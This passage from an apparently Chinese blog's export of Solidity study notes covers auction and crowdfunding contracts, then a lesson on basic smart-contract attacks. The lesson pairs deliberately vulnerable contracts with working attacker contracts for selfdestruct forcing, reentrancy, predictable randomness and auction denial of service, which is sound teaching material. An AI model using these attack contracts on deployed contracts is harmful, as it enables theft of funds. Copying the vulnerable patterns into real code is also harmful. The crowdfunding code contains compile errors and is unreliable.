<span class="title function_">End</span><span class="params">(address highestBidder,uint amount)</span>;</span><br><span class="line"></span><br><span class="line">    IERC721 public immutable nft;</span><br><span class="line">    uint public immutable nftId;</span><br><span class="line"></span><br><span class="line">    address payable public immutable seller;</span><br><span class="line">    uint32 public endAt;</span><br><span class="line">    <span class="type">bool</span> public started;</span><br><span class="line">    <span class="type">bool</span> public ended;</span><br><span class="line"></span><br><span class="line">    address public highestBidder;</span><br><span class="line">    uint public highestBid;</span><br><span class="line">    mapping(address =&gt;uint)public bids;<span class="comment">//记录失败投标人投入的钱</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor(address _nft,uint _nftId,uint _startingBid)&#123;</span><br><span class="line">        nft=IERC721(_nft);</span><br><span class="line">        nftId=_nftId;</span><br><span class="line">        seller=payable(msg.sender);</span><br><span class="line">        highestBid=_startingBid;<span class="comment">//以起初价格来初始化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">start</span><span class="params">()</span>external&#123;<span class="comment">//开始拍卖</span></span><br><span class="line">        require(msg.sender==seller,<span class="string">&quot;not seller&quot;</span>);</span><br><span class="line">        require(!started,<span class="string">&quot;started&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        started=<span class="literal">true</span>;</span><br><span class="line">        endAt=uint32(block.timestamp+<span class="number">60</span>);<span class="comment">//六十秒结束</span></span><br><span class="line">        nft.transferFrom(seller,address(this),nftId);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bid</span><span class="params">()</span>external payable&#123;<span class="comment">//参加的拍卖者再次竞标</span></span><br><span class="line">        require(started,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        require(msg.value&gt;highestBid,<span class="string">&quot;value &lt; hightest bid&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(highestBidder!=address(<span class="number">0</span>))&#123;</span><br><span class="line">            bids[highestBidder]+=highestBid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        highestBid=msg.value;</span><br><span class="line">        highestBidder=msg.sender;</span><br><span class="line"></span><br><span class="line">        emit <span class="title function_">Bid</span><span class="params">(msg.sender,msg.value)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">()</span>external&#123;<span class="comment">//失败的选手可在此提取原来竞拍投入的钱</span></span><br><span class="line">        uint bal=bids[msg.sender];</span><br><span class="line">        bids[msg.sender]=<span class="number">0</span>;</span><br><span class="line">        payable(msg.sender).transfer(bal);</span><br><span class="line">        emit <span class="title function_">Withdraw</span><span class="params">(msg.sender,bal)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">end</span><span class="params">()</span>external&#123;<span class="comment">//结束拍卖，并将nftId转入最高价的人</span></span><br><span class="line">        require(started,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(!ended,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        require(block.timestamp&gt;=endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ended=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(highestBidder!=address(<span class="number">0</span>))&#123;<span class="comment">//如果有人参加</span></span><br><span class="line">            nft.transferFrom(address(this),highestBidder,nftId);</span><br><span class="line">            seller.transfer(highestBid);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//没人参加highestBidders的地址为0</span></span><br><span class="line">            nft.transferFrom(address(this),seller,nftId);</span><br><span class="line">        &#125;</span><br><span class="line">        emit <span class="title function_">End</span><span class="params">(highestBidder,highestBid)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="众筹合约"><a href="#众筹合约" class="headerlink" title="众筹合约"></a>众筹合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">contract CrowdFund&#123;</span><br><span class="line">    event <span class="title function_">Launch</span><span class="params">(uint id,address indexed creator,uint goal,uint32 startAt,uint32 endAt)</span>;</span><br><span class="line">    event <span class="title function_">Cancel</span><span class="params">(uint id)</span>;</span><br><span class="line">    event <span class="title function_">Pledge</span><span class="params">(uint indexed id,address indexed caller,uint amount )</span>;</span><br><span class="line">    event <span class="title function_">Unpledge</span><span class="params">(uint indexed id,address indexed caller,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Claim</span><span class="params">(uint id)</span>;</span><br><span class="line">    event <span class="title function_">Refund</span><span class="params">(uint indexed id,address indexed caller,uint amount)</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Campaign</span>&#123;</span></span><br><span class="line">        address creator;</span><br><span class="line">        uint goal;</span><br><span class="line">        uint pledged;</span><br><span class="line">        uint32 startAt;</span><br><span class="line">        uint32 endAt;</span><br><span class="line">        <span class="type">bool</span> claimed;<span class="comment">//false筹款未被领走，true筹款被领走</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    IERC20 public immutable token;</span><br><span class="line">    uint public count;<span class="comment">//多少个筹款活动</span></span><br><span class="line">    mapping(uint =&gt;Campaign) public campaigns;<span class="comment">//每个合约的映射</span></span><br><span class="line">    mapping(uint=&gt;mapping(address=&gt;uint))public pledgeAmount;<span class="comment">//参与人参与第几个合约的数量</span></span><br><span class="line">    </span><br><span class="line">    constructor(address _token)&#123;</span><br><span class="line">        token=IERC20(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">launch</span><span class="params">(uint _goal,uint32 _startAt,uint32 _endAt)</span>external&#123;<span class="comment">//</span></span><br><span class="line">    require(startAt&gt;=block.timestamp,<span class="string">&quot;start at &lt; now&quot;</span>);</span><br><span class="line">    require(_endAt&gt;=_startAt,<span class="string">&quot;end at &lt; start at&quot;</span>);</span><br><span class="line">    require (_endAt&lt;=block.timestamp+<span class="number">90</span> days,<span class="string">&quot;end at &gt;max duration&quot;</span>);</span><br><span class="line">    count+=<span class="number">1</span>;</span><br><span class="line">    campaigns[count]=Campaign(&#123;</span><br><span class="line">        creator:msg.sender,</span><br><span class="line">        goal:_goal,</span><br><span class="line">        pledged:<span class="number">0</span>,</span><br><span class="line">        startAt:_startAt,</span><br><span class="line">        endAt:_endAt,</span><br><span class="line">        claimed:<span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    emit <span class="title function_">Launch</span><span class="params">(count, msg.sender,_goal,_startAt,_endAt)</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">cancel</span><span class="params">(uint _id)</span>external&#123;<span class="comment">//开始前取消众筹</span></span><br><span class="line">        Campaign memory campaign=campaigns[id];</span><br><span class="line">        require(msg.sender==campaign.creator,<span class="string">&quot;not creator&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;campaign.startAt,<span class="string">&quot;started&quot;</span>);</span><br><span class="line">        delete campaigns[id];</span><br><span class="line">        emit <span class="title function_">Cancel</span><span class="params">(_id)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">pledge</span><span class="params">(uint _id,uint _amount)</span>external&#123;<span class="comment">//参与众筹</span></span><br><span class="line">        Campaign storage campaign=campaigns[_id];</span><br><span class="line">        require(block.timestamp&gt;=campaign.startAt,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;=campaign.endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        campaign.pledged+=_amount;</span><br><span class="line">        pledgedAmount[_id][msg.sender]+=_amount;</span><br><span class="line">        token.transferFrom(msg.sender,address(this),_amount);</span><br><span class="line">        emit <span class="title function_">pledge</span><span class="params">(_id,msg.sender,_amount)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">unpledge</span><span class="params">(uint _id,uint _amount)</span>external&#123;<span class="comment">//撤消众筹</span></span><br><span class="line">    Campaign storage campaign=campaigns[_id];</span><br><span class="line">    require(block.timestamp&lt;=campaign.endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">    require(pledgeAmount[_id][msg.sender]&gt;=_amount);</span><br><span class="line">    campaign.pledged-=_amount;</span><br><span class="line">    pledgeAmount[_id][msg.sender]-=_amount;</span><br><span class="line"></span><br><span class="line">    token.transfer(msg.sender,_amount);</span><br><span class="line">    emit <span class="title function_">Unpledge</span><span class="params">(_id,msg.sender,_amount)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">claim</span><span class="params">(uint _id)</span>external&#123;</span><br><span class="line">        Campaign storage campaign=campaigns[_id];</span><br><span class="line">        require(msg.sender==campaign.creator,<span class="string">&quot;not creator&quot;</span>);</span><br><span class="line">        require(block.timestamp&gt;campaign.endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line">        require(campaign.pledged&gt;=campaign.goal,<span class="string">&quot;pledged&lt;goal&quot;</span>);</span><br><span class="line">        require(!campaign.claimed,<span class="string">&quot;claimed&quot;</span>);</span><br><span class="line">        campaign.claimed=<span class="literal">true</span>;</span><br><span class="line">        token.transferFrom(msg.sender,campaign.pledged);</span><br><span class="line">        emit <span class="title function_">Claim</span><span class="params">(_id)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">refund</span><span class="params">(uint _id)</span>external&#123;<span class="comment">//未达到目标就会失败，用户可以取走自己的钱</span></span><br><span class="line">    Campaign storage campaign=campaigns[_id];</span><br><span class="line">    require(block.timestamp&gt;campaign.endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line">    require(campaign.pledged&lt;campaign.goal,<span class="string">&quot;pledged&gt;goal&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uint bal=pledgeAmount[_id][msg.sender];</span><br><span class="line">    pledgeAmount[_id][msg.sender]=<span class="number">0</span>;</span><br><span class="line">    token.transfer(msg.sender,bal);</span><br><span class="line">    emit <span class="title function_">Refund</span><span class="params">(_id,msg.sender,bal)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础攻击</title>
      <link href="/2022/10/28/solidity%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB/"/>
      <url>/2022/10/28/solidity%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="这是我第一篇文章"><a href="#这是我第一篇文章" class="headerlink" title="这是我第一篇文章"></a>这是我第一篇文章</h2><div class="note default simple"><p>我的小标签 </p></div><h1 id="solidity漏洞"><a href="#solidity漏洞" class="headerlink" title="solidity漏洞"></a>solidity漏洞</h1><h3 id="1，自毁函数攻击"><a href="#1，自毁函数攻击" class="headerlink" title="1，自毁函数攻击"></a>1，自毁函数攻击</h3><p><strong>通过selfdestruce自会函数进行强制转账，导致合约中受到7ether，然后卡死</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract EtherGame&#123;#幸运七游戏：第七个传入以太币的人会得到前面的以太币</span><br><span class="line">    address public winner;</span><br><span class="line">    uint TARGET_AMOUNT=7 ether;</span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        require(msg.value==1 ether,&quot;you can only send 1 ether&quot;);</span><br><span class="line">        uint balances=address(this).balance;</span><br><span class="line">        require(balances&lt;=TARGET_AMOUNT,&quot;game is over&quot;);</span><br><span class="line">        if(balances==TARGET_AMOUNT)&#123;</span><br><span class="line">            winner=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender==winner,&quot;not pass&quot;);</span><br><span class="line">        (bool send,)=msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(send,&quot;failed&quot;);</span><br><span class="line">        winner=address(0);</span><br><span class="line">    &#125;</span><br><span class="line">    function getbalance()public view returns(uint)&#123;</span><br><span class="line">    return address(this).balance;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address  to)external&#123;</span><br><span class="line">            selfdestruct(payable(to));</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()public view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="2，重入攻击"><a href="#2，重入攻击" class="headerlink" title="2，重入攻击"></a>2，重入攻击</h3><p><strong>该攻击利用fallback函数的触发来做到递归取款，一直会取以太只到取完。fallback触发条件为：1.收到以太 2.调用合约中不存在的函数时</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.6;#重入攻击只能在0.8.0版本以下</span><br><span class="line">contract Bank &#123;</span><br><span class="line"> mapping(address =&gt; uint) public balances; //账本，用来记录每一个用户的账户余额</span><br><span class="line"> //取款</span><br><span class="line"> function withdraw(uint _amount) external payable &#123;</span><br><span class="line">     //用户余额大于存款额，否侧错误</span><br><span class="line">     require (balances[msg.sender] &gt;= _amount,&quot;balance is insufficient&quot;);</span><br><span class="line">     //转账给用户</span><br><span class="line">     (bool sent,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">     //是否成功，不成功返回数据</span><br><span class="line">     require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">     //扣除转出去的钱</span><br><span class="line">     balances[msg.sender] -= _amount;</span><br><span class="line">     &#125;</span><br><span class="line">     //存款</span><br><span class="line">     function deposit() public payable &#123;</span><br><span class="line">          balances[msg.sender] += msg.value;//存款  [用户可使用]</span><br><span class="line">          &#125;//查看余额</span><br><span class="line">          function getBalance() external view returns (uint) &#123;</span><br><span class="line">              return address(this).balance;</span><br><span class="line">              &#125;</span><br><span class="line">              constructor() payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    //攻击目标</span><br><span class="line">    Bank public bank;</span><br><span class="line">    //参数为攻击目标的地址</span><br><span class="line">    constructor(address payable _address)payable &#123;</span><br><span class="line">        bank = Bank(_address);</span><br><span class="line">        &#125;</span><br><span class="line">        //2攻击</span><br><span class="line">        function attack() external payable &#123;</span><br><span class="line">            bank.deposit&#123;value: 1 ether&#125;();//先存再取出</span><br><span class="line">            bank.withdraw(1 ether);</span><br><span class="line">            &#125;</span><br><span class="line">            //回退</span><br><span class="line">            fallback() external payable &#123;</span><br><span class="line">                if (address(bank).balance &gt;= 1 ether) &#123;</span><br><span class="line">                    bank.withdraw(1 ether);</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // 查看合同余额</span><br><span class="line">                    function getBalance() external view returns (uint) &#123;</span><br><span class="line">                        return address(this).balance;</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="3，随机数攻击"><a href="#3，随机数攻击" class="headerlink" title="3，随机数攻击"></a>3，随机数攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract Random&#123;</span><br><span class="line">    function guess()public payable &#123;</span><br><span class="line">        bool result=_getRandom();</span><br><span class="line">        if(result)&#123;</span><br><span class="line">            address _to=msg.sender;</span><br><span class="line">         _to.call&#123;value:1 ether&#125;(&quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function _getRandom()public view returns(bool)&#123;</span><br><span class="line">        uint random=uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)));</span><br><span class="line">        if(random%2==0)&#123;</span><br><span class="line">            return false;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;return true;&#125;</span><br><span class="line">           </span><br><span class="line">&#125;</span><br><span class="line">constructor()payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    function attack(address _random)external payable&#123;</span><br><span class="line">        for(uint i=0;i&lt;1;i++)&#123;</span><br><span class="line">            if(payable(_random).balance&lt;1)&#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            if(uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)))%2!=0)&#123;</span><br><span class="line">                Random(_random).guess();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()external view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4，拒绝服务攻击"><a href="#4，拒绝服务攻击" class="headerlink" title="4，拒绝服务攻击"></a>4，拒绝服务攻击</h3><p><strong>利用合约无法收款的特性来攻击，当合约没用fallback函数与receive函数时合约就无法收到外部转账或者退钱，因此投标函数无法完整的向下执行，不会改变winner的地址，winner会被一直霸占</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract  Auction&#123;</span><br><span class="line">    address public winner;</span><br><span class="line">    uint public amount;</span><br><span class="line">    function bid()external payable&#123;</span><br><span class="line">        require(msg.value&gt;0,&quot;amount is too small&quot;);</span><br><span class="line">        require(msg.value&gt;amount,&quot;amount is too small&quot;);//如不符合要求则进行回退</span><br><span class="line">        payable(winner).transfer(amount);</span><br><span class="line">        winner=msg.sender;</span><br><span class="line">        amount=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()external view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address target,uint amount)external payable&#123;</span><br><span class="line">        Auction(payable (target)).bid&#123;value:amount&#125;();</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="5，访问控制攻击"><a href="#5，访问控制攻击" class="headerlink" title="5，访问控制攻击"></a>5，访问控制攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public – 公共状态变量可以在内部访问，也可以通过消息访问。对于公共状态变量，将生成一个自动getter函数。</span><br><span class="line">internal – 内部状态变量只能从当前合约或其派生合约内访问。</span><br><span class="line">private – 私有状态变量只能从当前合约内部访问，派生合约内不能访问</span><br><span class="line">external — 外部状态变量只能在合约之外调用，不能被合约内的其他函数调用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity基础攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础知识点（一）</title>
      <link href="/2022/10/28/solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/10/28/solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity-基础知识（一）"><a href="#solidity-基础知识（一）" class="headerlink" title="solidity 基础知识（一）"></a>solidity 基础知识（一）</h1><h2 id="报错控制的相关知识点"><a href="#报错控制的相关知识点" class="headerlink" title="报错控制的相关知识点"></a>报错控制的相关知识点</h2><p>用于检查<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract error&#123;<span class="comment">//报错控制</span></span><br><span class="line">    function <span class="title function_">testrequire</span><span class="params">(uint i)</span>public pure&#123;</span><br><span class="line">        require(i&lt;=<span class="number">10</span>,<span class="string">&quot;i&gt;10&quot;</span>);<span class="comment">//不满足则报错字符串内容</span></span><br><span class="line">    &#125;<span class="comment">//gas费与字符长度有关，报错之后会回滚到报错前的状态</span></span><br><span class="line"></span><br><span class="line">    function <span class="title function_">testrevert</span><span class="params">(uint i)</span>public pure&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">10</span>)&#123;</span><br><span class="line">            revert(<span class="string">&quot;i&gt;10&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        uint public num=<span class="number">123</span>;</span><br><span class="line">        function <span class="title function_">testassert</span><span class="params">()</span>public view&#123;</span><br><span class="line">            assert(num==<span class="number">123</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        function <span class="title function_">foo</span><span class="params">()</span>public&#123;</span><br><span class="line">            num+=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="comment">//num加1之后就不满足testassert函数，再调用testassert就会报错</span></span><br><span class="line">        error <span class="title function_">Myerror</span><span class="params">(address caller,uint i)</span>;<span class="comment">//自定义错误来节约gas</span></span><br><span class="line">        function <span class="title function_">testcustom</span><span class="params">(uint i)</span>public view&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">10</span>)&#123;</span><br><span class="line">                revert <span class="title function_">Myerror</span><span class="params">(msg.sender,i)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="函数修改器知识"><a href="#函数修改器知识" class="headerlink" title="函数修改器知识"></a>函数修改器知识</h2><p>修饰器（modifier）是 solidity 特有的语法，它就像钢铁侠的智能盔甲，有特定功能，也可以控制访问权限。modifier 的主要使用场景是运行函数前的检查，例如地址，变量，余额等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">contract functionmodifier&#123;<span class="comment">//函数修改器</span></span><br><span class="line">    <span class="type">bool</span> public paused;</span><br><span class="line">    uint public count;</span><br><span class="line">    function <span class="title function_">setPause</span><span class="params">(<span class="type">bool</span> _paused)</span>external&#123;</span><br><span class="line">        paused=_paused;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">whenpaused</span><span class="params">()</span>&#123;</span><br><span class="line">        